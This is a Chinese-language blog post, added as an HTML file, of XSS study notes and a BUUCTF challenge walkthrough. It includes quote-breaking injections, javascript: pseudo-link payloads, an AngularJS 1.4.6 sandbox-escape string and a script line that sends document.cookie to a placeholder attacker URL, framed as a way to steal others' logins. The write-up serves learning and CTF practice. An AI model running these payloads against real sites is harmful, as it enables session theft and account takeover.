@@ -1,0 +1,704 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="学习笔记、思路整理(损版)">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xss漏洞学习">
+<meta property="og:url" content="http://example.com/2022/07/07/xss%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="学习笔记、思路整理(损版)">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-07-07T12:15:34.000Z">
+<meta property="article:modified_time" content="2022-07-12T13:03:42.000Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>xss漏洞学习 - Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>Links</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/background1.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="xss漏洞学习"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-07-07 20:15" pubdate>
+          July 7, 2022 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.4k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          12 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">xss漏洞学习</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>学习笔记、思路整理(损版)</p>
+<span id="more"></span>
+
+<p>用来偷别人cookie的，这样就可以用这个cookie做坏事辽(比如登录qq空间)</p>
+<h1 id="笔记"><a href="#笔记" class="headerlink" title="笔记"></a>笔记</h1><h2 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h2><h2 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h2><h2 id="DOM-XSS"><a href="#DOM-XSS" class="headerlink" title="DOM XSS"></a>DOM XSS</h2><p><a target="_blank" rel="noopener" href="http://xsst.sinaapp.com/example/1-1.php">参考教程</a></p>
+<p>首先，还是闭合<br>其次，是检查有无没有被ban的函数<br>eg: </p>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xquery">page=<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span>   //没啥用，就是弹个窗<br>page=<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">location.<span class="hljs-property">href</span>=<span class="hljs-string">&#x27;http://你自己的网站/evil.php?cookie=&#x27;</span>+<span class="hljs-built_in">encodeURIComponent</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br>/*<br>解释: location.href=<span class="hljs-string">&quot;恶意地址&quot;</span>; //这句话可以让当前页面(location)的地址(href)，跳转到恶意地址<span class="hljs-built_in"></span><br><span class="hljs-built_in">document</span>.cookie //就是当前页面的cookies数据<br>encodeURIComponent<span class="hljs-built_in">(document</span>.cookie) //就是将cookies数据编码一下(防止cookies中有特殊的符号，导致地址错误)<br>location.href=<span class="hljs-string">&quot;恶意地址&quot;</span>+encodeURIComponent<span class="hljs-built_in">(document</span>.cookie) //就是将编码后的数据加在恶意地址之后<br>*/<br>然后是闭合，比如已知js代码: var page= <span class="hljs-string">&quot;1&quot;</span>;    //此处的<span class="hljs-number">1</span>是传入的参数page，可替换、闭合<br>http://xsst.sinapp.com/example/<span class="hljs-number">1</span>-<span class="hljs-number">2</span>.php?page=<span class="hljs-string">&quot;;alert(document.cookie);//</span><br><span class="hljs-string">http://xsst.sinapp.com/example/1-2.php?page=&quot;</span>;alert<span class="hljs-built_in">(document</span>.cookie);<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">$</span>(<span class="hljs-params">str</span>)&#123;<br>	<span class="hljs-keyword">if</span>(!<span class="hljs-regexp">/^#[^&#x27;]+&quot;[^&quot;]+&quot;\]/</span>.<span class="hljs-title function_">test</span>(str))&#123;    <span class="hljs-comment">//额 &quot; &lt;  &gt;被过滤</span><br>		<span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;error&quot;</span>;<br>	&#125;<br>&#125;<br><span class="hljs-keyword">var</span> page=$(<span class="hljs-string">&#x27;#test a[href=&quot;1&quot;]&#x27;</span>);<br><span class="hljs-keyword">var</span> page=$(<span class="hljs-string">&#x27;#test a[href=&quot;&quot;]&#x27;</span>);<span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>);<span class="hljs-keyword">var</span> a=$(<span class="hljs-string">&#x27;#test a[href=&quot;1&quot;]&#x27;</span>);<br><span class="hljs-string">&quot;]&#x27;);alert(document.cookie);var a=$(&#x27;#test a[href=&quot;</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+<h2 id="Dom-based的反射型XSS"><a href="#Dom-based的反射型XSS" class="headerlink" title="Dom-based的反射型XSS"></a>Dom-based的反射型XSS</h2><h1 id="简单实战-buuctf-web进阶-XSS闯关"><a href="#简单实战-buuctf-web进阶-XSS闯关" class="headerlink" title="简单实战: [buuctf web进阶]XSS闯关"></a>简单实战: [buuctf web进阶]XSS闯关</h1><h2 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h2><p>查看源码，发现无任何过滤(源码里没有js代码)，输入即可弹窗</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>)&lt;/script&gt;<br></code></pre></td></tr></table></figure>
+<h2 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h2><p>查看源码，username被escape函数过滤过(escape函数: 就是把函数url编码)</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br>    <span class="hljs-keyword">if</span>(location.<span class="hljs-property">search</span> == <span class="hljs-string">&quot;&quot;</span>)&#123;<br>		location.<span class="hljs-property">search</span> = <span class="hljs-string">&quot;?username=xss&quot;</span><br>   	&#125;<br>	<span class="hljs-keyword">var</span> username = <span class="hljs-string">&#x27;7bmk&#x27;</span>;<br>	<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;ccc&#x27;</span>).<span class="hljs-property">innerHTML</span>= <span class="hljs-string">&quot;Welcome &quot;</span> + <span class="hljs-built_in">escape</span>(username);<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>
+<p>那要咋闭合捏？&lt;&gt;&#x2F;()都被转化为url，可以这样构造，产生闭合var username&#x3D;’’里的’’和后面的&lt;&#x2F; script&gt;: </p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?u</span>sername=<span class="hljs-string">&#x27;;alert(document.cookie);//</span><br></code></pre></td></tr></table></figure>
+<h2 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h2><p>查看源码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br>	<span class="hljs-keyword">if</span>(location.<span class="hljs-property">search</span> == <span class="hljs-string">&quot;&quot;</span>)&#123;<br>		location.<span class="hljs-property">search</span> = <span class="hljs-string">&quot;?username=xss&quot;</span><br>	&#125;<br>	<span class="hljs-keyword">var</span> username = <span class="hljs-string">&#x27;xss&#x27;</span>;<br>	<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;ccc&#x27;</span>).<span class="hljs-property">innerHTML</span>= <span class="hljs-string">&quot;Welcome &quot;</span> + username;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>
+<p>这不和上一关没区别吗，相同payload试试，发现引号被过滤了: </p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br>	<span class="hljs-keyword">if</span>(location.<span class="hljs-property">search</span> == <span class="hljs-string">&quot;&quot;</span>)&#123;<br>		location.<span class="hljs-property">search</span> = <span class="hljs-string">&quot;?username=xss&quot;</span><br>	&#125;<br>    <span class="hljs-keyword">var</span> username = <span class="hljs-string">&#x27;\&#x27;;alert(document.cookie);//&#x27;</span>;<br>	<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;ccc&#x27;</span>).<span class="hljs-property">innerHTML</span>= <span class="hljs-string">&quot;Welcome &quot;</span> + username;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>
+<p>但是，这个只过滤了1个引号，而不是在所有的引号前加...这我就匪夷所思啊，谁在做网站防护时会这么防…. 还只转义1个引号不转义其他的…</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">username</span>=<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-comment">;alert(1);//</span><br></code></pre></td></tr></table></figure>
+<h2 id="第四关-伪链接"><a href="#第四关-伪链接" class="headerlink" title="第四关(伪链接)"></a>第四关(伪链接)</h2><p>页面每10s重定向1次，通过禁用js停止跳转，然后查看源代码: </p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br>	<span class="hljs-keyword">var</span> time = <span class="hljs-number">10</span>;<br>	<span class="hljs-keyword">var</span> jumpUrl;<br>	<span class="hljs-keyword">if</span>(<span class="hljs-title function_">getQueryVariable</span>(<span class="hljs-string">&#x27;jumpUrl&#x27;</span>) == <span class="hljs-literal">false</span>)&#123; <span class="hljs-comment">//getQueryVariable()用于获取url参数</span><br>		jumpUrl = location.<span class="hljs-property">href</span>;<br>	&#125;<span class="hljs-keyword">else</span>&#123;<br>	jumpUrl = <span class="hljs-title function_">getQueryVariable</span>(<span class="hljs-string">&#x27;jumpUrl&#x27;</span>);<br>	&#125;<br>	<span class="hljs-built_in">setTimeout</span>(jump,<span class="hljs-number">1000</span>,time);<br>	<span class="hljs-keyword">function</span> <span class="hljs-title function_">jump</span>(<span class="hljs-params">time</span>)&#123;<br>		<span class="hljs-keyword">if</span>(time == <span class="hljs-number">0</span>)&#123;<br>			location.<span class="hljs-property">href</span> = jumpUrl;<br>		&#125;<span class="hljs-keyword">else</span>&#123;<br>			time = time - <span class="hljs-number">1</span> ;<br>			<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;ccc&#x27;</span>).<span class="hljs-property">innerHTML</span>= <span class="hljs-string">`页面<span class="hljs-subst">$&#123;time&#125;</span>秒后将会重定向到<span class="hljs-subst">$&#123;<span class="hljs-built_in">escape</span>(jumpUrl)&#125;</span>`</span>;<br>			<span class="hljs-built_in">setTimeout</span>(jump,<span class="hljs-number">1000</span>,time);<br>		&#125;<br>	&#125;<br>	<span class="hljs-keyword">function</span> <span class="hljs-title function_">getQueryVariable</span>(<span class="hljs-params">variable</span>)&#123;<br>	    <span class="hljs-keyword">var</span> query = <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">search</span>.<span class="hljs-title function_">substring</span>(<span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">var</span> vars = query.<span class="hljs-title function_">split</span>(<span class="hljs-string">&quot;&amp;&quot;</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i=<span class="hljs-number">0</span>;i&lt;vars.<span class="hljs-property">length</span>;i++) &#123;<br>           <span class="hljs-keyword">var</span> pair = vars[i].<span class="hljs-title function_">split</span>(<span class="hljs-string">&quot;=&quot;</span>);<br>           <span class="hljs-keyword">if</span>(pair[<span class="hljs-number">0</span>] == variable)&#123;<span class="hljs-keyword">return</span> pair[<span class="hljs-number">1</span>];&#125;<br>		&#125;<br>		<span class="hljs-keyword">return</span>(<span class="hljs-literal">false</span>);<br>		&#125;<br>&lt;script&gt;<br></code></pre></td></tr></table></figure>
+<p>这关的知识点是伪链接:<br>javascript:alert(1)，浏览器会把javascript后面的那一段内容当做代码，直接在当前页面执行。<br>于是payload: </p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">jumpUrl</span>=javascript:alert(<span class="hljs-number">1</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
+<p>困惑: 我怎么知道get传的参是jumpUrl呢? 当然是通过getQueryVariable(): getQueryVariable()用于获取url参数</p>
+<h2 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h2><p>查看源码: </p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br>	<span class="hljs-keyword">if</span>(<span class="hljs-title function_">getQueryVariable</span>(<span class="hljs-string">&#x27;autosubmit&#x27;</span>) !== <span class="hljs-literal">false</span>)&#123;  <span class="hljs-comment">//参数autosubmit必须要有，且要经过getQueryVariable的过滤</span><br>		<span class="hljs-keyword">var</span> autoForm = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;autoForm&#x27;</span>);    <span class="hljs-comment">//啊...类似字典吧，id是html的标签的标志....还是滚去学html吧</span><br>		autoForm.<span class="hljs-property">action</span> = (<span class="hljs-title function_">getQueryVariable</span>(<span class="hljs-string">&#x27;action&#x27;</span>) == <span class="hljs-literal">false</span>) ? location.<span class="hljs-property">href</span> : <span class="hljs-title function_">getQueryVariable</span>(<span class="hljs-string">&#x27;action&#x27;</span>);<span class="hljs-comment">//还是看wp吧...这说明，先学完技巧后，还要学基础</span><br>		autoForm.<span class="hljs-title function_">submit</span>();<br>	&#125;<br>    <span class="hljs-keyword">else</span>&#123;&#125;<br>	<span class="hljs-keyword">function</span> <span class="hljs-title function_">getQueryVariable</span>(<span class="hljs-params">variable</span>)&#123;<br>       <span class="hljs-keyword">var</span> query = <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">search</span>.<span class="hljs-title function_">substring</span>(<span class="hljs-number">1</span>);  <span class="hljs-comment">//获得当前页面get请求的指定参数(?后的部分，为1字符串)</span><br>       <span class="hljs-keyword">var</span> vars = query.<span class="hljs-title function_">split</span>(<span class="hljs-string">&quot;&amp;&quot;</span>);<br>       <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i=<span class="hljs-number">0</span>;i&lt;vars.<span class="hljs-property">length</span>;i++) &#123;<br>               <span class="hljs-keyword">var</span> pair = vars[i].<span class="hljs-title function_">split</span>(<span class="hljs-string">&quot;=&quot;</span>);<br>               <span class="hljs-keyword">if</span>(pair[<span class="hljs-number">0</span>] == variable)&#123;<span class="hljs-keyword">return</span> pair[<span class="hljs-number">1</span>];&#125;<br>       &#125;<br>       <span class="hljs-keyword">return</span>(<span class="hljs-literal">false</span>);<br>	&#125;<br>&lt;script&gt;<br></code></pre></td></tr></table></figure>
+<p>不难，审就完事了(所以里面的POST压根毫无关系就是来混淆的是吗…)</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">autosubmit</span>=1&amp;action=javascript:alert(1);<br></code></pre></td></tr></table></figure>
+<h2 id="第六关-angular沙箱逃逸"><a href="#第六关-angular沙箱逃逸" class="headerlink" title="第六关(angular沙箱逃逸)"></a>第六关(angular沙箱逃逸)</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script text=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br>    <span class="hljs-keyword">if</span>(location.<span class="hljs-property">search</span> == <span class="hljs-string">&quot;&quot;</span>)&#123;<br>        location.<span class="hljs-property">search</span> = <span class="hljs-string">&quot;?username=xss&quot;</span><br>    &#125;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>
+<p>嗯….这关的过滤没有在源代码里写，然后显示的方式是在html里而8是js，所以没法执行alert…个p<br>搜索script关键字，发现有个main.js文件</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript">_alert = alert;<br>alert = <span class="hljs-keyword">function</span>(<span class="hljs-params">info</span>)&#123;<br>	<span class="hljs-title function_">_alert</span>(<span class="hljs-string">&quot;过关成功！进入下一关！&quot;</span>);<br>	<span class="hljs-keyword">var</span> current_level = location.<span class="hljs-property">pathname</span>.<span class="hljs-title function_">match</span>(<span class="hljs-regexp">/level([0-9]+)/</span>)[<span class="hljs-number">1</span>];<span class="hljs-comment">//额。。。。匹配到的第一个</span><br>	<span class="hljs-keyword">var</span> next_level = <span class="hljs-built_in">parseInt</span>(current_level) + <span class="hljs-number">1</span>;<br>	location.<span class="hljs-property">href</span> = <span class="hljs-string">&quot;/level&quot;</span> + next_level;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>然后看球不懂，实际上这玩意也没啥卵用…</p>
+<p>实际上突破点在源码里的另一处链接: <a target="_blank" rel="noopener" href="https://cdn.staticfile.org/angular.js/1.4.6/angular.min.js">https://cdn.staticfile.org/angular.js/1.4.6/angular.min.js</a><br>是一个angular 1.4.6框架</p>
+<h2 id="参考-angular-1-6沙箱逃逸"><a href="#参考-angular-1-6沙箱逃逸" class="headerlink" title="参考: angular 1.6沙箱逃逸"></a>参考: angular 1.6沙箱逃逸</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4638">参考链接</a><br>angular是1个前端框架，在Angular1.6以前的版本，有很多绕过方式，而在这之后的版本，沙箱已被删除，为此也就8存在沙箱逃逸了</p>
+<h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><p>对于angular 1.6以下的版本，输入20，若返回的结果为20，则存在漏洞</p>
+<h3 id="逃逸"><a href="#逃逸" class="headerlink" title="逃逸"></a>逃逸</h3><p>payload:</p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;a&#x27;.constructor.prototype.charAt</span>=[].join;$eval(<span class="hljs-name">&#x27;x=1&#125; &#125; &#125;;alert(1)//&#x27;</span>);&#125;&#125;</span><br></code></pre></td></tr></table></figure>
+<p>其中的alert(1)可被其他payload替换</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/CTF/%E5%9F%BA%E7%A1%80/" class="category-chain-item">基础</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/web/" class="print-no-link">#web</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>xss漏洞学习</div>
+      <div>http://example.com/2022/07/07/xss漏洞学习/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>July 7, 2022</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/07/13/ssrf%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" title="ssrf漏洞姿势">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">ssrf漏洞姿势</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/05/30/sh1t/" title="如何凭实力被刚认识的女生拉黑">
